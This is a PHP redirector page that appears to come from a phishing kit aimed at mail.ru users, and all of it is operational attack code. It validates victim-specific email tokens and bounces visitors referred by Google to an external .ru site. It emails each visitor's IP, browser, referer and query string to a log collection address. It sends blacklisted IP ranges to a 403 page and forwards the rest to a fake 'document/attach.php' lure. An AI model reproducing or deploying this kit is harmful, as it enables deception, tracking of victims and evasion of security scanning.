<HTML>




<?
$email=$_GET['email'];
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];
$id=$_GET['id'];
$b=$_GET['b'];

$ban = false;
if ($email != base64_decode($b)) $ban = true;
if (md5($email) != $id) $ban = true;

if ($ban)
{
echo '<META HTTP-EQUIV="refresh" CONTENT="0; url=https://403">';
exit;
}

?>







<?php
session_start();
if (stripos($_SERVER['HTTP_REFERER'],"google.com")){
header('Location: https://cayt.ru./');
exit();
}
?>






<?php
     $Date = date("d-m-y H:i:s", time());
     $browser = getenv("HTTP_USER_AGENT");
     $ref = getenv("HTTP_REFERER");
     $ip = getenv("REMOTE_ADDR");
     $query = UrlDecode(getenv("QUERY_STRING"));
     
     $text = "Date: $Date\nBrowser: $browser\nReferer: $ref\nIP: $ip\nQuery: $query\n\n";
   

$subject="$email";
$header="Content-type: text/html; charset=windows-1251 \r\n";
$header.="From: redic <125845@redmail.ru> \r\n";
$header.="Subject: $subject \r\n";
$header.="Content-type: text/html; charset=windows-1251 \r\n";
$msg="<body>
<xbody>
$text
</xbody>

</body>";
mail('mail dlya logs', $query, $msg, $header);

?>


<?
error_reporting(0);
$blackips = file_get_contents('blackip.txt');
$ipe = explode(".",$_SERVER["REMOTE_ADDR"]);
$ip_mask = $ipe[0].'.'.$ipe[1].'.'.$ipe[2];
if (preg_match("/$ip_mask/i", $blackips)) {
//black IP
 header("Location: https://e.mail.ru/403"); header("Location: https://e.mail.ru/403");echo "$notfound<div style=\"visibility:hidden\">bi</div>"; die();
}
?>


<HEAD>




 <?php
$tmp=$_SERVER['QUERY_STRING'];
header("Location: https://fakedomen/document/attach.php?$tmp");
exit;
?>








</BODY>
</HTML>